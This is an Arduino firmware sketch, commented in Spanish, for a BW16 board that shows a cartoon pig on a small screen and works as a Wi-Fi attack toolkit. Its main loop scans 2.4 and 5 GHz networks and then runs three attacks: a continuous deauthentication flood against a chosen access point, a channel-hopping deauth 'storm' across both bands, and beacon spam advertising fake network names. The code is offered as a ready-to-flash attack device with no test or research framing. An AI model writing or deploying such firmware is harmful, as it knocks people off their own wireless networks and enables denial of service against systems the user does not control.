/*
 ==============================================================================
  PORKCHOP BW16 (RTL8720DN) - DUAL-BAND 2.4GHz / 5GHz WI-FI TOOLKIT
 ==============================================================================
  Adaptado para:
   - Módulo: Realtek RTL8720DN / BW16 (Dual-Band 2.4GHz & 5GHz Wi-Fi + BLE)
   - Pantalla: 1.8" TFT ST7735 (128x160 píxeles SPI)
   - Controles: 4 Botones Físicos (ARRIBA, ABAJO, SELECCIONAR, ATRÁS)
   - Mascota: Cerdito ASCII / Gráfico interactivo estilo Tamagotchi / Pwnagotchi
 ==============================================================================
*/

#undef max
#include <vector>
#include <Arduino.h>
#include <SPI.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h>

// Librerías del SDK de Realtek AmebaD
#include "wifi_conf.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "packet_injection.h"
#include "porkchop_ui.h"

// ==============================================================================
// CONFIGURACIÓN DE PINES PARA BW16 (RTL8720DN)
// ==============================================================================

// --- Conexiones Pantalla TFT ST7735 1.8" (128x160 SPI) ---
#define TFT_CS    PA27  // Chip Select SPI
#define TFT_DC    PA25  // Data / Command
#define TFT_RST   PA26  // Reset
#define TFT_SCLK  PA14  // SPI1 Clock (SCL)
#define TFT_MOSI  PA12  // SPI1 Data (SDA)
#define TFT_BL    PA30  // Luz de fondo (Backlight)

// --- 4 Botones Físicos (Conectados entre el GPIO y GND con INPUT_PULLUP) ---
#define BTN_UP    PB1   // Botón 1: Arriba
#define BTN_DOWN  PB2   // Botón 2: Abajo
#define BTN_OK    PB3   // Botón 3: Seleccionar / Entrar
#define BTN_BACK  PA28  // Botón 4: Atrás / Detener / Salir

// Instancia de pantalla ST7735 (Hardware SPI)
Adafruit_ST7735 tft = Adafruit_ST7735(TFT_CS, TFT_DC, TFT_RST);

// ==============================================================================
// ESTRUCTURAS Y VARIABLES GLOBALES
// ==============================================================================

struct ScannedAP {
  String ssid;
  uint8_t bssid[6];
  uint8_t channel;
  int16_t rssi;
  bool is5GHz;
};

std::vector<ScannedAP> apList;
int selectedAPIndex = 0;
int menuSelection = 0;
uint32_t deauthPacketsSent = 0;
uint32_t beaconsSent = 0;
uint32_t lastAnimTick = 0;
uint32_t lastAttackTick = 0;

enum AppState {
  STATE_IDLE,         // Mascota cerdito descansando
  STATE_MENU,         // Menú principal
  STATE_SCANNING,     // Escaneando redes 2.4G y 5G
  STATE_AP_LIST,      // Lista de redes encontradas
  STATE_ATTACK_OINK,  // Deauth a un AP específico
  STATE_ATTACK_STORM, // Tormenta de deauth dual-band (Warhog)
  STATE_BEACON_SPAM,  // Spam de APs falsos (Bacon)
  STATE_STATS         // Estadísticas de combate
};

AppState currentState = STATE_IDLE;
PorkMood currentMood = MOOD_IDLE;

// Lista de SSIDs falsos para el ataque BACON
const char* FAKE_SSIDS[] = {
  "Porkchop_VIP_5G", "Oink_Free_WiFi", "Bacon_HQ_5G",
  "Free_Ham_WiFi",   "Piggy_Zone_5G",  "Boar_Net_Secure",
  "Pwnagotchi_Pig",  "Sausage_5GHz",   "Truffle_Hunter"
};
const int FAKE_SSID_COUNT = 9;

// Canales dual band para el barrido continuo (Warhog)
const uint8_t DUAL_CHANNELS[] = {
  1, 6, 11, 36, 40, 44, 48, 52, 56, 60, 64, 100, 149, 153, 157, 161
};
const int DUAL_CH_COUNT = 16;
int stormChannelIndex = 0;

// ==============================================================================
// RUTINAS DE BOTONES FÍSICOS CON ANTIRREBOTE
// ==============================================================================

bool btnPressed(int pin) {
  static uint32_t lastPressTime[40] = {0};
  uint32_t now = millis();
  if (digitalRead(pin) == LOW) {
    if (now - lastPressTime[pin] > 200) {
      lastPressTime[pin] = now;
      return true;
    }
  }
  return false;
}

// ==============================================================================
// CALLBACK DE ESCANEO WI-FI DUAL-BAND (AMEBAD RTL8720DN)
// ==============================================================================

rtw_result_t scanCallback(rtw_scan_handler_result_t *scan_result) {
  if (scan_result->scan_complete == 0) {
    rtw_scan_result_t *record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;

    ScannedAP ap;
    ap.ssid = String((const char *)record->SSID.val);
    if (ap.ssid.length() == 0) ap.ssid = "<SSID Oculto>";
    ap.channel = record->channel;
    ap.rssi = record->signal_strength;
    ap.is5GHz = (ap.channel >= 36);
    memcpy(ap.bssid, record->BSSID.octet, 6);

    // Evitar duplicados por BSSID
    bool exists = false;
    for (size_t i = 0; i < apList.size(); i++) {
      if (memcmp(apList[i].bssid, ap.bssid, 6) == 0) {
        exists = true;
        break;
      }
    }
    if (!exists && apList.size() < 40) {
      apList.push_back(ap);
    }
  }
  return RTW_SUCCESS;
}

void triggerDualBandScan() {
  tft.fillScreen(COLOR_PIG_BG);
  tft.setTextColor(COLOR_5GHZ);
  tft.setTextSize(1);
  tft.setCursor(10, 30);
  tft.print("ESCANEANDO...");
  tft.setTextColor(COLOR_WHITE);
  tft.setCursor(10, 50);
  tft.print("2.4 GHz + 5 GHz");
  PigGraphics::drawPorkchopFace(tft, 64, 100, MOOD_HUNTING);

  apList.clear();
  wifi_scan_networks(scanCallback, NULL);
  delay(4000); // Dar tiempo al radio de explorar ambas bandas

  currentState = STATE_AP_LIST;
  selectedAPIndex = 0;
  drawAPListUI();
}

// ==============================================================================
// INTERFACES GRÁFICAS (128x160)
// ==============================================================================

void drawTopBar(const char* title, uint16_t color) {
  tft.fillRect(0, 0, 128, 14, color);
  tft.setTextColor(COLOR_PIG_BG, color);
  tft.setTextSize(1);
  tft.setCursor(4, 3);
  tft.print(title);
}

void drawIdleScreen() {
  tft.fillScreen(COLOR_PIG_BG);
  drawTopBar("PORKCHOP DUAL-5G", COLOR_PIG_PINK);

  // Cara de Porkchop
  PigGraphics::drawPorkchopFace(tft, 64, 60, currentMood);

  // Tarjeta de estadísticas
  tft.fillRoundRect(6, 104, 116, 50, 4, COLOR_DARK_CARD);
  tft.drawRoundRect(6, 104, 116, 50, 4, COLOR_WHITE);

  tft.setTextColor(COLOR_ACCENT);
  tft.setTextSize(1);
  tft.setCursor(12, 110);
  tft.print("RANGO: BOAR BOSS");

  tft.setTextColor(COLOR_5GHZ);
  tft.setCursor(12, 122);
  tft.printf("DEAUTHS: %u", deauthPacketsSent);

  tft.setTextColor(COLOR_24GHZ);
  tft.setCursor(12, 134);
  tft.printf("APS DUAL: %d", (int)apList.size());

  tft.setTextColor(COLOR_GRAY);
  tft.setCursor(12, 144);
  tft.print("[OK] Abrir Menu");
}

void drawMenuUI() {
  tft.fillScreen(COLOR_PIG_BG);
  drawTopBar("MENU PRINCIPAL", COLOR_ACCENT);

  const char* items[] = {
    "1. ESCANEAR 2.4/5G",
    "2. DEAUTH OINK",
    "3. TORMENTA WARHOG",
    "4. BEACON BACON",
    "5. ESTADISTICAS",
    "6. VOLVER (IDLE)"
  };
  const int itemCount = 6;

  for (int i = 0; i < itemCount; i++) {
    int y = 22 + (i * 22);
    if (i == menuSelection) {
      tft.fillRoundRect(4, y, 120, 18, 4, COLOR_ACCENT);
      tft.setTextColor(COLOR_PIG_BG);
    } else {
      tft.drawRoundRect(4, y, 120, 18, 4, COLOR_DARK_CARD);
      tft.setTextColor(COLOR_WHITE);
    }
    tft.setCursor(8, y + 5);
    tft.print(items[i]);
  }
}

void drawAPListUI() {
  tft.fillScreen(COLOR_PIG_BG);
  drawTopBar("REDES DETECTADAS", COLOR_5GHZ);

  if (apList.empty()) {
    tft.setTextColor(COLOR_DANGER);
    tft.setCursor(10, 40);
    tft.print("No hay redes.");
    tft.setCursor(10, 60);
    tft.print("[OK] Reintentar");
    tft.setCursor(10, 80);
    tft.print("[BACK] Salir");
    return;
  }

  int start = (selectedAPIndex / 5) * 5;
  for (int i = 0; i < 5; i++) {
    int idx = start + i;
    if (idx >= (int)apList.size()) break;

    int y = 20 + (i * 26);
    if (idx == selectedAPIndex) {
      tft.fillRoundRect(2, y, 124, 23, 4, COLOR_WHITE);
      tft.setTextColor(COLOR_PIG_BG);
    } else {
      tft.fillRoundRect(2, y, 124, 23, 4, COLOR_DARK_CARD);
      tft.setTextColor(COLOR_WHITE);
    }

    // Nombre SSID
    tft.setCursor(6, y + 3);
    String truncSSID = apList[idx].ssid;
    if (truncSSID.length() > 14) truncSSID = truncSSID.substring(0, 14);
    tft.print(truncSSID);

    // Banda (5G o 2.4G) y Canal
    tft.setCursor(6, y + 13);
    if (apList[idx].is5GHz) {
      tft.setTextColor(COLOR_5GHZ);
      tft.printf("5G CH:%d", apList[idx].channel);
    } else {
      tft.setTextColor(COLOR_24GHZ);
      tft.printf("2.4G CH:%d", apList[idx].channel);
    }

    tft.setTextColor(COLOR_GRAY);
    tft.setCursor(75, y + 13);
    tft.printf("%ddBm", apList[idx].rssi);
  }
}

void drawAttackScreen(const char* modeName, const char* targetName, uint8_t channel, bool is5G) {
  tft.fillScreen(COLOR_PIG_BG);
  drawTopBar(modeName, COLOR_DANGER);

  PigGraphics::drawPorkchopFace(tft, 64, 56, MOOD_ATTACKING);

  tft.fillRoundRect(4, 96, 120, 58, 4, COLOR_DARK_CARD);
  tft.drawRoundRect(4, 96, 120, 58, 4, COLOR_DANGER);

  tft.setTextSize(1);
  tft.setTextColor(COLOR_WHITE);
  tft.setCursor(8, 102);
  tft.printf("TARGET: %s", targetName);

  tft.setCursor(8, 114);
  tft.setTextColor(is5G ? COLOR_5GHZ : COLOR_24GHZ);
  tft.printf("BANDA: %s | CH: %d", is5G ? "5.0GHz" : "2.4GHz", channel);

  tft.setCursor(8, 126);
  tft.setTextColor(COLOR_DANGER);
  tft.printf("DEAUTHS: %u", deauthPacketsSent);

  tft.setCursor(8, 140);
  tft.setTextColor(COLOR_GRAY);
  tft.print("[BACK] Detener");
}

// ==============================================================================
// SETUP Y BUCLE PRINCIPAL (LOOP)
// ==============================================================================

void setup() {
  Serial.begin(115200);
  delay(1000);
  Serial.println("\n[SISTEMA] Iniciando Porkchop BW16 (RTL8720DN)...");

  // Configurar los 4 Botones con resistencia PULLUP interna
  pinMode(BTN_UP,   INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_OK,   INPUT_PULLUP);
  pinMode(BTN_BACK, INPUT_PULLUP);

  // Configurar luz de fondo
  pinMode(TFT_BL, OUTPUT);
  digitalWrite(TFT_BL, HIGH);

  // Inicializar pantalla ST7735 (128x160)
  tft.initR(INITR_BLACKTAB);
  tft.setRotation(0); // Orientación vertical 128 ancho x 160 alto
  tft.fillScreen(COLOR_PIG_BG);

  Serial.println("[TFT] ST7735 128x160 Inicializada OK.");

  // Inicializar Wi-Fi en modo promiscuo/estación
  wifi_on(RTW_MODE_STA);

  drawIdleScreen();
}

void loop() {
  uint32_t now = millis();

  // --- NAVEGACIÓN SEGÚN EL ESTADO ACTUAL ---
  switch (currentState) {

    // ======================== MODO IDLE ========================
    case STATE_IDLE:
      if (btnPressed(BTN_OK)) {
        currentState = STATE_MENU;
        menuSelection = 0;
        drawMenuUI();
      }
      else if (btnPressed(BTN_UP)) {
        currentMood = (PorkMood)(((int)currentMood + 1) % 6);
        drawIdleScreen();
      }
      else if (btnPressed(BTN_DOWN)) {
        currentMood = (currentMood == MOOD_IDLE) ? MOOD_SLEEPING : (PorkMood)((int)currentMood - 1);
        drawIdleScreen();
      }
      break;

    // ======================== MENÚ PRINCIPAL ========================
    case STATE_MENU:
      if (btnPressed(BTN_UP)) {
        if (menuSelection > 0) menuSelection--;
        drawMenuUI();
      }
      else if (btnPressed(BTN_DOWN)) {
        if (menuSelection < 5) menuSelection++;
        drawMenuUI();
      }
      else if (btnPressed(BTN_BACK)) {
        currentState = STATE_IDLE;
        drawIdleScreen();
      }
      else if (btnPressed(BTN_OK)) {
        switch (menuSelection) {
          case 0: // Escaneo Dual Band
            triggerDualBandScan();
            break;
          case 1: // Deauth Oink (necesita lista)
            if (apList.empty()) {
              triggerDualBandScan();
            } else {
              currentState = STATE_AP_LIST;
              drawAPListUI();
            }
            break;
          case 2: // Tormenta Warhog
            currentState = STATE_ATTACK_STORM;
            deauthPacketsSent = 0;
            drawAttackScreen("WARHOG DUAL-5G", "TODOS (STORM)", 36, true);
            break;
          case 3: // Beacon Spam Bacon
            currentState = STATE_BEACON_SPAM;
            beaconsSent = 0;
            drawAttackScreen("BACON SPAMMER", "SPAM BALIZAS", 6, false);
            break;
          case 4: // Estadísticas
            currentState = STATE_STATS;
            tft.fillScreen(COLOR_PIG_BG);
            drawTopBar("SWINE STATS", COLOR_ACCENT);
            tft.setTextColor(COLOR_WHITE);
            tft.setCursor(10, 30);
            tft.printf("Deauths: %u", deauthPacketsSent);
            tft.setCursor(10, 50);
            tft.printf("Beacons: %u", beaconsSent);
            tft.setCursor(10, 70);
            tft.printf("APs en RAM: %d", (int)apList.size());
            tft.setCursor(10, 100);
            tft.setTextColor(COLOR_GRAY);
            tft.print("[BACK] Salir");
            break;
          case 5: // Volver
            currentState = STATE_IDLE;
            drawIdleScreen();
            break;
        }
      }
      break;

    // ======================== LISTA DE APs ========================
    case STATE_AP_LIST:
      if (btnPressed(BTN_UP)) {
        if (selectedAPIndex > 0) selectedAPIndex--;
        drawAPListUI();
      }
      else if (btnPressed(BTN_DOWN)) {
        if (selectedAPIndex < (int)apList.size() - 1) selectedAPIndex++;
        drawAPListUI();
      }
      else if (btnPressed(BTN_BACK)) {
        currentState = STATE_MENU;
        drawMenuUI();
      }
      else if (btnPressed(BTN_OK) && !apList.empty()) {
        // Lanzar ataque OINK al AP seleccionado
        currentState = STATE_ATTACK_OINK;
        wifi_set_channel(apList[selectedAPIndex].channel);
        drawAttackScreen("OINK DEAUTH", apList[selectedAPIndex].ssid.c_str(),
                         apList[selectedAPIndex].channel, apList[selectedAPIndex].is5GHz);
      }
      break;

    // ======================== ATAQUE OINK (DEAUTH AP) ========================
    case STATE_ATTACK_OINK:
      if (btnPressed(BTN_BACK)) {
        currentState = STATE_AP_LIST;
        drawAPListUI();
        break;
      }

      // Enviar ráfaga de tramas Deauth cada 30 ms
      if (now - lastAttackTick >= 30) {
        lastAttackTick = now;
        uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

        // Enviar 3 tramas Deauth por ciclo
        for (int b = 0; b < 3; b++) {
          wifi_tx_deauth_frame(apList[selectedAPIndex].bssid, broadcast, 0x0006);
          deauthPacketsSent++;
        }

        // Actualizar contador en pantalla cada 500 ms
        static uint32_t lastTextUpd = 0;
        if (now - lastTextUpd >= 500) {
          lastTextUpd = now;
          tft.fillRect(60, 126, 60, 12, COLOR_DARK_CARD);
          tft.setTextColor(COLOR_DANGER);
          tft.setCursor(60, 126);
          tft.print(deauthPacketsSent);
        }
      }
      break;

    // ======================== TORMENTA WARHOG (DUAL-BAND DEAUTH) ========================
    case STATE_ATTACK_STORM:
      if (btnPressed(BTN_BACK)) {
        currentState = STATE_MENU;
        drawMenuUI();
        break;
      }

      // Salto rápido de canal e inyección en 2.4G y 5G
      if (now - lastAttackTick >= 40) {
        lastAttackTick = now;
        stormChannelIndex = (stormChannelIndex + 1) % DUAL_CH_COUNT;
        uint8_t ch = DUAL_CHANNELS[stormChannelIndex];
        wifi_set_channel(ch);

        uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        uint8_t fakeAP[6] = {0x00, 0x14, 0x22, (uint8_t)(ch * 7), 0x55, 0xAA};
        wifi_tx_deauth_frame(fakeAP, bcast, 0x0006);
        deauthPacketsSent += 2;
      }
      break;

    // ======================== BEACON SPAM (BACON) ========================
    case STATE_BEACON_SPAM:
      if (btnPressed(BTN_BACK)) {
        currentState = STATE_MENU;
        drawMenuUI();
        break;
      }

      if (now - lastAttackTick >= 25) {
        lastAttackTick = now;
        static int fakeIdx = 0;
        fakeIdx = (fakeIdx + 1) % FAKE_SSID_COUNT;

        uint8_t fakeMAC[6] = {0x00, 0xE0, 0x4C, (uint8_t)fakeIdx, 0x77, 0x88};
        wifi_tx_beacon_frame(fakeMAC, FAKE_SSIDS[fakeIdx], 6);
        beaconsSent++;
      }
      break;

    // ======================== ESTADÍSTICAS ========================
    case STATE_STATS:
      if (btnPressed(BTN_BACK) || btnPressed(BTN_OK)) {
        currentState = STATE_MENU;
        drawMenuUI();
      }
      break;
  }
}
